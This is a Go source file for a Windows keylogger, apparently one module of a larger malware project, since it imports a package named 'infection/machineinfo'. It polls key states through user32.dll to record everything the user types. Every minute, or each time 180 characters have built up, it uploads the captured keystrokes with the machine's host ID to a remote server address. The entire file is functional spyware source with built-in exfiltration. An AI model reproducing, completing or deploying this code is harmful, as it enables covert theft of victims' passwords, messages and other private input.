package hitboard

import (
	"github.com/AllenDang/w32"
	"github.com/parnurzeal/gorequest"
	"infection/machineinfo"
	"log"
	"syscall"
	"time"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	// procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW = user32.NewProc("GetWindowTextW") //GetWindowTextW
	tmpKeylog          string
	KeyCount           = 180
)

type msg struct {
	Record string `json:"hit"`
	Hostid string `json:"hostid"`
}

type KeyboardStatusResponse struct {
	Succeed bool `json:"succeed"`
}

func KeyBoardCollection(addr string) {
	start := time.Now()
	elapsed := time.Since(start)
	elapsedsec := int64(elapsed/time.Millisecond) / 1000
	for {
		time.Sleep(60 * time.Millisecond)
		log.Println(tmpKeylog)
		elapsed := time.Since(start)
		elapsedsec = int64(elapsed/time.Millisecond) / 1000
		// 1mins 60s   hitting 180 times keyboard
		keyboardStatusResponse := KeyboardStatusResponse{}
		var versionDetail = machineinfo.GetSystemVersion()
		if elapsedsec == 60 {
			msgstb := msg{
				Record: tmpKeylog,
				Hostid: versionDetail.Hostid,
			}
			log.Println("upload msg", &msgstb)
			resp, _, err := gorequest.New().
				Post(addr).
				Set("content-type", "application/x-www-form-urlencoded").
				Send(msgstb).
				EndStruct(&keyboardStatusResponse)
			if err != nil {
				log.Println("error:", err)
			}
			if resp.StatusCode == 200 && keyboardStatusResponse.Succeed {
				log.Println("Upload keyboard record Status Successful !")
			} else {
				log.Println("Upload keyboard record Status Fail !")
			}
			continue
		} else if len(tmpKeylog) >= KeyCount {
			msgstb := msg{
				Record: tmpKeylog,
				Hostid: versionDetail.Hostid,
			}
			log.Println("upload msg", &msgstb)
			resp, _, err := gorequest.New().
				Post(addr).
				Set("content-type", "application/x-www-form-urlencoded").
				Send(msgstb).
				EndStruct(&keyboardStatusResponse)
			if err != nil {
				log.Println("error:", err)
			}
			if resp.StatusCode == 200 && keyboardStatusResponse.Succeed {
				log.Println("Upload keyboard record Status Successful !")
			} else {
				log.Println("Upload keyboard record Status Fail !")
			}
			tmpKeylog = ""
			continue
		}
		log.Println(tmpKeylog, "-----")
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val&0x1 == 0 {
				continue
			}
			switch KEY {
			// case w32.VK_CONTROL:
			// 	tmpKeylog += "[Ctrl]"
			// case w32.VK_BACK:
			// 	tmpKeylog += "[Back]"
			//case w32.VK_TAB:
			//	tmpKeylog += "[Tab]"
			case w32.VK_RETURN:
				tmpKeylog += "[Enter]\r\n"
			case w32.VK_SHIFT:
				tmpKeylog += "[Shift]"
			// case w32.VK_MENU:
			// 	tmpKeylog += "[Alt]"
			case w32.VK_CAPITAL:
				tmpKeylog += "[CapsLock]"
			case w32.VK_ESCAPE:
				tmpKeylog += "[Esc]"
			case w32.VK_SPACE:
				tmpKeylog += " "
				// case w32.VK_PRIOR:
				// 	tmpKeylog += "[PageUp]"
				// case w32.VK_NEXT:
				// 	tmpKeylog += "[PageDown]"
				// case w32.VK_END:
				// 	tmpKeylog += "[End]"
				// case w32.VK_HOME:
				// 	tmpKeylog += "[Home]"
				// case w32.VK_LEFT:
				// 	tmpKeylog += "[Left]"
				// case w32.VK_UP:
				// 	tmpKeylog += "[Up]"
				// case w32.VK_RIGHT:
				// 	tmpKeylog += "[Right]"
				// case w32.VK_DOWN:
				// 	tmpKeylog += "[Down]"
				// case w32.VK_SELECT:
				// 	tmpKeylog += "[Select]"
				// case w32.VK_PRINT:
				// 	tmpKeylog += "[Print]"
				// case w32.VK_EXECUTE:
				// 	tmpKeylog += "[Execute]"
				// case w32.VK_SNAPSHOT:
				// 	tmpKeylog += "[PrintScreen]"
				// case w32.VK_INSERT:
				// 	tmpKeylog += "[Insert]"
				// case w32.VK_DELETE:
				// 	tmpKeylog += "[Delete]"
				// case w32.VK_HELP:
				// 	tmpKeylog += "[Help]"
				// case w32.VK_LWIN:
				// 	tmpKeylog += "[LeftWindows]"
				// case w32.VK_RWIN:
				// 	tmpKeylog += "[RightWindows]"
				// case w32.VK_APPS:
				// 	tmpKeylog += "[Applications]"
				// case w32.VK_SLEEP:
				// 	tmpKeylog += "[Sleep]"
				// case w32.VK_NUMPAD0:
				// 	tmpKeylog += "[Pad 0]"
				// case w32.VK_NUMPAD1:
				// 	tmpKeylog += "[Pad 1]"
				// case w32.VK_NUMPAD2:
				// 	tmpKeylog += "[Pad 2]"
				// case w32.VK_NUMPAD3:
				// 	tmpKeylog += "[Pad 3]"
				// case w32.VK_NUMPAD4:
				// 	tmpKeylog += "[Pad 4]"
				// case w32.VK_NUMPAD5:
				// 	tmpKeylog += "[Pad 5]"
				// case w32.VK_NUMPAD6:
				// 	tmpKeylog += "[Pad 6]"
				// case w32.VK_NUMPAD7:
				// 	tmpKeylog += "[Pad 7]"
				// case w32.VK_NUMPAD8:
				// 	tmpKeylog += "[Pad 8]"
				// case w32.VK_NUMPAD9:
				// 	tmpKeylog += "[Pad 9]"
			case w32.VK_NUMPAD0:
				tmpKeylog += "0"
			case w32.VK_NUMPAD1:
				tmpKeylog += "1"
			case w32.VK_NUMPAD2:
				tmpKeylog += "2"
			case w32.VK_NUMPAD3:
				tmpKeylog += "3"
			case w32.VK_NUMPAD4:
				tmpKeylog += "4"
			case w32.VK_NUMPAD5:
				tmpKeylog += "5"
			case w32.VK_NUMPAD6:
				tmpKeylog += "6"
			case w32.VK_NUMPAD7:
				tmpKeylog += "7"
			case w32.VK_NUMPAD8:
				tmpKeylog += "8"
			case w32.VK_NUMPAD9:
				tmpKeylog += "9"
			case w32.VK_MULTIPLY:
				tmpKeylog += "*"
			case w32.VK_ADD:
				tmpKeylog += "+"
				// case w32.VK_SEPARATOR:
				// tmpKeylog += "[Separator]"
			case w32.VK_SUBTRACT:
				tmpKeylog += "-"
			case w32.VK_DECIMAL:
				tmpKeylog += "."
				// case w32.VK_DIVIDE:
				// 	tmpKeylog += "[Devide]"
				// case w32.VK_F1:
				// 	tmpKeylog += "[F1]"
				// case w32.VK_F2:
				// 	tmpKeylog += "[F2]"
				// case w32.VK_F3:
				// 	tmpKeylog += "[F3]"
				// case w32.VK_F4:
				// 	tmpKeylog += "[F4]"
				// case w32.VK_F5:
				// 	tmpKeylog += "[F5]"
				// case w32.VK_F6:
				// 	tmpKeylog += "[F6]"
				// case w32.VK_F7:
				// 	tmpKeylog += "[F7]"
				// case w32.VK_F8:
				// 	tmpKeylog += "[F8]"
				// case w32.VK_F9:
				// 	tmpKeylog += "[F9]"
				// case w32.VK_F10:
				// 	tmpKeylog += "[F10]"
				// case w32.VK_F11:
				// 	tmpKeylog += "[F11]"
				// case w32.VK_F12:
				// 	tmpKeylog += "[F12]"
				// case w32.VK_NUMLOCK:
				// 	tmpKeylog += "[NumLock]"
				// case w32.VK_SCROLL:
				// 	tmpKeylog += "[ScrollLock]"
				// case w32.VK_LSHIFT:
				// 	tmpKeylog += "[LeftShift]"
				// case w32.VK_RSHIFT:
				// 	tmpKeylog += "[RightShift]"
				// case w32.VK_LCONTROL:
				// 	tmpKeylog += "[LeftCtrl]"
				// case w32.VK_RCONTROL:
				// 	tmpKeylog += "[RightCtrl]"
				// case w32.VK_LMENU:
				// 	tmpKeylog += "[LeftMenu]"
				// case w32.VK_RMENU:
				// 	tmpKeylog += "[RightMenu]"
			case w32.VK_OEM_1:
				tmpKeylog += ";"
			case w32.VK_OEM_2:
				tmpKeylog += "/"
			case w32.VK_OEM_3:
				tmpKeylog += "`"
			case w32.VK_OEM_4:
				tmpKeylog += "["
			case w32.VK_OEM_5:
				tmpKeylog += "\\"
			case w32.VK_OEM_6:
				tmpKeylog += "]"
			case w32.VK_OEM_7:
				tmpKeylog += "'"
			case w32.VK_OEM_PERIOD:
				tmpKeylog += "."
			case 0x30:
				tmpKeylog += "0"
			case 0x31:
				tmpKeylog += "1"
			case 0x32:
				tmpKeylog += "2"
			case 0x33:
				tmpKeylog += "3"
			case 0x34:
				tmpKeylog += "4"
			case 0x35:
				tmpKeylog += "5"
			case 0x36:
				tmpKeylog += "6"
			case 0x37:
				tmpKeylog += "7"
			case 0x38:
				tmpKeylog += "8"
			case 0x39:
				tmpKeylog += "9"
			case 0x41:
				tmpKeylog += "a"
			case 0x42:
				tmpKeylog += "b"
			case 0x43:
				tmpKeylog += "c"
			case 0x44:
				tmpKeylog += "d"
			case 0x45:
				tmpKeylog += "e"
			case 0x46:
				tmpKeylog += "f"
			case 0x47:
				tmpKeylog += "g"
			case 0x48:
				tmpKeylog += "h"
			case 0x49:
				tmpKeylog += "i"
			case 0x4A:
				tmpKeylog += "j"
			case 0x4B:
				tmpKeylog += "k"
			case 0x4C:
				tmpKeylog += "l"
			case 0x4D:
				tmpKeylog += "m"
			case 0x4E:
				tmpKeylog += "n"
			case 0x4F:
				tmpKeylog += "o"
			case 0x50:
				tmpKeylog += "p"
			case 0x51:
				tmpKeylog += "q"
			case 0x52:
				tmpKeylog += "r"
			case 0x53:
				tmpKeylog += "s"
			case 0x54:
				tmpKeylog += "t"
			case 0x55:
				tmpKeylog += "u"
			case 0x56:
				tmpKeylog += "v"
			case 0x57:
				tmpKeylog += "w"
			case 0x58:
				tmpKeylog += "x"
			case 0x59:
				tmpKeylog += "y"
			case 0x5A:
				tmpKeylog += "z"

			}
		}
	}
}
